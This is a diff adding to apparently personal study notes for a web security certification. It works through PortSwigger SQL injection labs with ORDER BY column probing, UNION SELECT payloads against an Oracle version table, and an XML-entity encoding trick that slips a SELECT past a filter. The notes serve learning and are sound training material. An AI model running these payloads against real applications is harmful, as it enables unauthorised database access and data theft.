@@ -31,6 +31,23 @@
 - For example, UNION attack with following input: `' UNION SELECT @@version--`
 - **REMEMBER** - you need to determine the number of columns first before performing a UNION attack.
   - Performed `' ORDER BY 2--'` - determined 2 columns, as 3 returned an error (category='+ORDER+BY+2--')
+- Once I determined 2 columns, I knew I needed to add an additional column to call for in my request: `' UNION SELECT banner,null FROM v&version--`
+  - `' UNION SELECT banner,null FROM v$version--`
+  - `' UNION SELECT version, null FROM v$instance--` did not work for this Oracle database. 
 
 ![image](https://github.com/madslaz/Burp-Suite-Certified-Practitioner/assets/52518274/cc5bd783-036f-4acc-9d71-c7452b4a7d63)
+
+## SQL injection with filter bypass via XML encoding
+- Different formats, such as JSON or XML, may provide you ways to obfuscate attacks that are otherwise blocked [Link](https://portswigger.net/web-security/essential-skills/obfuscating-attacks-using-encodings#obfuscation-via-xml-encoding)
+- For example, the following XML-based SQL injection uses an XML escape sequence to encode the S character in SELECT [W3 UTF-8 Link](https://www.w3schools.com/charsets/ref_utf_basic_latin.asp):
+
+```
+<stockCheck>
+    <productId>123</productId>
+    <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
+</stockCheck>
+
+*The x indicates Hex for UTF-8 HTML, I believe*
+```
+
 
